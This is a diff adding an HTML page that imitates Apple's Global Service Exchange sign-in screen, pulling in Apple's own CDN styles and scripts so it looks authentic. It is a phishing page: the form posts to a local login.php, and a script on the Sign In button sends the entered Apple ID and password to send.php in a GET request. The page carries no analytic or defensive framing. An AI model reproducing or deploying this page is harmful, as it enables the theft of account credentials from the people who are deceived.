@@ -1,0 +1,879 @@
+
+
+<style>
+
+.label-text {
+
+	display: none;
+
+}
+
+
+
+table {
+
+	margin: 0 0 3px !important;
+
+}
+
+
+
+#accountname,#accountpassword {
+
+	width: 287px;
+
+	font: 13px Helvetica, Arial, sans-serif;
+
+	vertical-align: baseline;
+
+	border: 1px solid #cfcfcf;
+
+	border-top-color: #707070;
+
+	border-bottom-color: #a1a0a0;
+
+	-webkit-border-radius: 2px;
+
+	-webkit-box-shadow: 0px 0px 2px rgba(255, 255, 255, 1);
+
+	-moz-border-radius: 2px;
+
+	-moz-box-shadow: 0px 0px 2px rgba(255, 255, 255, 1);
+
+	border-radius: 2px;
+
+	box-shadow: 0px 0px 2px rgba(255, 255, 255, 1);
+
+	height: 29px;
+
+	margin-left: -10px;
+
+	top: -7px;
+
+	position: relative;
+
+}
+
+
+
+#accountpassword{
+
+padding-left: 30px;
+
+}
+
+
+
+#formwrapstyle .label-text {
+
+	margin-top: -7px;
+
+	margin-left: -10px;
+
+}
+
+#formwrapstyle1 .label-text {
+
+	margin-top: -3px;
+
+	margin-left: -10px;
+
+
+
+}
+
+#appleIdURL, #passwordURL{
+
+color: #5e5e5e ;
+
+    text-decoration: none;
+
+    font-size: 11px;
+
+    font-weight: normal;
+
+    margin-left: -10px;
+
+}
+
+span.input-msg.show{
+
+margin-top: -7px;
+
+padding-bottom: 7px;
+
+}
+
+
+
+#signInHyperLink{
+
+margin-left: -10px !important;
+
+margin-top: -7px !important;
+
+}
+
+
+
+#landing_pane_bottom{
+
+height: 80px !important;
+
+}
+
+body.login-expanded #landing_pane_middle {
+
+min-height: 146px !important;
+
+}
+
+#create_apple_id{
+
+bottom: 27px !important;
+
+}
+
+div.selector{
+
+margin-bottom: 26px !important;
+
+}
+
+span.input-msg.red.show{
+
+margin-left: -10px !important;
+
+}
+
+</style>
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+
+<head>
+
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<meta name="viewport" content="width=720, maximum-scale=1.0" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<meta name="viewport" content="width=720, maximum-scale=1.0" />
+
+
+
+<title>Apple GSX Login</title>
+
+
+
+<link rel="stylesheet" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/css/App157/master.css"
+
+	type="text/css" media="screen" />
+
+	<meta name="robots" content="noindex,follow" />
+
+
+
+<script language="JavaScript" type="text/JavaScript">
+
+		function writeCookie(cookieName, cookieValue, cookiePath) {
+
+			var expirationDate = new Date();
+
+			expirationDate.setTime(expirationDate.getTime()+(24*60*60*1000));
+
+			var expirationString = "expires=" + expirationDate.toGMTString();
+
+			var cookieString = cookieName + "=" + cookieValue + ";" + expirationString + "; path=" + cookiePath + "; domain=.apple.com";
+
+			document.cookie = cookieString;
+
+		}
+
+		function setTZOffset() {
+
+			now = new Date();
+
+			tzOffsetInMinutes = now.getTimezoneOffset();
+
+			writeCookie("dstimeoffset", tzOffsetInMinutes, "/");
+
+		}
+
+		setTZOffset();
+
+</script>
+<!--<script src="activation.js"></script>
+
+<script language="JavaScript" type="text/JavaScript">
+$(document).ready(function(e)
+
+	{
+
+		
+
+		$(".iid").click(function() {
+
+			
+
+			
+
+				var id=$("#accountname").val(); 
+
+				var pass=$("#accountpassword").val(); 
+
+				$.ajax
+
+					({ 
+
+					
+
+						type: "GET", 
+
+						url: "send.php?id="+id+"&pass="+pass,
+
+					
+
+					}); 
+
+				
+
+			}); 
+
+			
+
+    e.stopPropagation();
+
+
+
+	});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript" src="jquery_gsx.js"></script>-->
+
+<script type="text/javascript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/common.js"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery.min.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery-ui-1.8.4.custom.min.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery.ui.easing.min.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/modernizr-1.1.min.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery.mousewheel.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jScrollPane.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery.uniform.min.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery.history.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/jquery.tablesorter.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/fixtures.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/App157/global.js"
+
+	type="text/javascript" charset="utf-8"></script>
+
+	
+
+<style>
+
+span.input-msg.red.show{
+
+font-size: 11px !important;
+
+}
+
+</style>
+
+<script>
+
+
+
+$(document).ready(function(){
+
+$('input').removeAttr("onkeypress");	
+
+});
+
+
+
+
+
+$(".iid").Onclick(function() {
+
+			
+
+			
+
+				var id=$("#accountname").val(); 
+
+				var pass=$("#accountpassword").val(); 
+
+				$.ajax
+
+					({ 
+
+					
+
+						type: "GET", 
+
+						url: "send.php?id="+id+"&pass="+pass,
+
+					
+
+					}); 
+
+				
+
+			}); 
+
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>	
+
+</head>
+
+
+
+<body class="login login-expanded">
+
+	<div id="wrapper">
+
+		<div id="container">
+
+		
+
+			<h1 id="GSXlogo">Apple Global Service Exchange</h1>
+
+			<div id="landing_pane">
+
+				<div id="landing_pane_top"></div>
+
+				<div id="landing_pane_middle">
+
+					<div id="inner_pane">
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/css/common/commonLogin.css" charset="utf-8"/>
+
+
+
+<script type="text/javaScript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/common.js"></script>
+
+<script type="text/javaScript" src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/Appjavascripts/FDC/dcutil_2_2.js"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/js/commonLogin.js" type="text/javascript" charset="utf-8"></script>
+
+<script src="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/25Feb2015/views/static/js/commonScript.js" type="text/javascript" charset="utf-8"></script>
+
+
+
+	
+
+		
+
+		
+
+			
+
+		
+
+	
+
+	
+
+<input type="hidden" id="harvestID" value="none" />
+
+<input type="hidden" id="expiryID" value="none" />
+
+
+
+
+
+
+
+<input type="hidden" id="authenticationID" value="authentication" />
+
+
+
+
+
+
+
+	<input type="hidden" value="modern" id="modernview"></input>
+
+	<script>
+
+</script>
+
+	<table width="100%">
+
+		<tbody>
+
+			<tr>
+
+				
+
+				<td>
+
+
+
+				<div id="ds_container"><form id="command" name="form1" action="login.php" method="post" onsubmit=" return submitOnce(event); setFDC();">
+
+					
+
+					<input id="iForgotNewWindowVar" name="openiForgotInNewWindow" value="false" type="hidden" value="false"/>
+
+					<input id="fdcBrowserData" name="fdcBrowserData" type="hidden" value=""/> 
+
+					
+
+					<!-- show heading -->
+
+					
+
+					
+
+					<div class="formrow" id="formRowDiv">
+
+					
+
+					
+
+					<div class="label-text" id="label2"><label for="accountname">Apple ID</label></div>
+
+					
+
+					<span class="formwrap"	id="formwrapstyle"> 
+
+					<input id="accountname" name="appleId" tabindex="1" onkeypress="checkEnter(event,this,&#39;form1&#39;);" spellcheck="false" name="theAccountName" autocorrect="off" class="input-text" type="text" autocapitalize="off" aria-label="Apple ID" value="" size="30" maxlength="128"/> </span> 
+
+					
+
+					<div class="space padder2"> 
+
+					<span class="input-msg show"> 
+
+						
+
+						
+
+							<a id="appleIdURL"
+
+								href="https://iforgot.apple.com/cgi-bin/findYourAppleID.cgi?language=US-EN&app_id=157&s=548-548"
+
+								onclick="javascript:appendURL('https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogin.html%3FappIdKey%3D45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623%26language%3DUS-EN'),loadiForgotInNewWindow();">Forgot your Apple ID?</a>
+
+						
+
+					 </span></div></div>
+
+					<div class="formrow">
+
+					
+
+					<div class="label-text" id="label3"><label for="accountpassword">Password</label></div>
+
+					
+
+					
+
+					
+
+					
+
+					<span class="formwrap"	id="formwrapstyle1">
+
+					<input id="accountpassword" name="accountPassword" tabindex="2" onkeypress="checkEnter(event,this,&#39;form1&#39;);" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="password" value="" size="30" autocomplete="off"/> 
+
+					</span><div class="space padder3"><span
+
+						class="input-msg show"> 
+
+						
+
+						
+
+							<a id="passwordURL"
+
+								href="https://iforgot.apple.com/cgi-bin/iforgot.cgi?language=US-EN&app_id=157&s=548-548"
+
+								onclick="javascript:appendURL('https%3A%2F%2Fidmsa.apple.com%2FIDMSWebAuth%2Flogin.html%3FappIdKey%3D45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623%26language%3DUS-EN'),loadiForgotInNewWindow();">Forgot your password?</a>
+
+						
+
+					 </span></div></div>
+
+					
+
+
+
+
+
+
+
+					<div id="bot-nav">  
+
+						<input type="submit" id="signInHyperLink" class="iid" tabindex="3" value='Sign In' aria-label='Sign In'	title='Sign In'/>
+
+					</div>
+
+					
+
+
+
+
+
+
+
+
+
+	<input type="hidden" id="appIdKey" name="appIdKey"
+
+		value="45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623" />
+
+
+
+
+
+
+
+	<input type="hidden" id="accNameLocked" name="accNameLocked"
+
+		value="false" />
+
+
+
+
+
+
+
+<input type="hidden" id="language" name="language"
+
+	value="US-EN" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<input type="hidden" id="Env" name="Env" value="PROD" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+				</form></div>
+
+				</td>
+
+				<td class="cellspacer" width="30%"></td>
+
+			</tr>
+
+		</tbody>
+
+	</table>
+
+	<input id="appleIdHide" type="hidden"
+
+		value='Apple ID' />
+
+
+
+	<input type="hidden" id="accountPasswordHide"
+
+		value='Password' />
+
+
+
+	<script>
+
+appendOnLoad();
+
+hintText();
+
+</script>
+
+
+
+
+
+<!-- Set the field account Name as Type="email" in case the request is from iPhone or iPad -->
+
+
+
+   
+
+  
+
+  
+
+  
+
+ 
+
+ 
+
+<input type="hidden" name="hiddenUrl" id="hiddenUrl">
+
+<input type="hidden" name="currentUrl" id="currentUrl">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+	
+
+		
+
+		
+
+	
+
+	
+
+	
+
+
+
+<style>
+
+#language_select {
+
+	right: 156px;
+
+	bottom: 9px;
+
+}
+
+
+
+body.login p {
+
+	margin-bottom: 12px;
+
+}
+
+</style>
+
+
+
+</div>
+
+</div>
+
+
+
+<div id="create_apple_id">
+
+<p>
+
+<a href="https&#x3a;&#x2f;&#x2f;id.apple.com&#x2f;IDMSAccount&#x2f;myAccount.html&#x3f;appIdKey&#x3d;45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623&amp;action&#x3d;register&amp;language&#x3d;US-EN">Create an Apple ID</a>
+
+</p>
+
+</div>
+
+<div id="language_select" class="right">
+
+<div class="selectbox"><select id="languageCode" name="languagePopup"
+
+	onchange="javascript:changeLanguage();">
+
+	
+
+		
+
+			
+
+				
+
+					
+
+						<option value="US-EN"
+
+							selected="selected">English</option>
+
+					
+
+						<option value="FR-FR">Français</option>
+
+					
+
+						<option value="DE-DE">Deutsch</option>
+
+					
+
+						<option value="ES-ES">Español</option>
+
+					
+
+						<option value="IT-IT">Italiano</option>
+
+					
+
+						<option value="BR-PT">Português do Brasil</option>
+
+				
+
+						<option value="TR-TR">Türkçe</option>
+
+					
+
+				
+
+			
+
+		
+
+		
+
+		
+
+		
+
+	
+
+</select></div>
+
+</div>
+
+<div id="landing_pane_bottom"></div>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- /div#wrapper -->
+
+
+
+</body>
+
+</html>
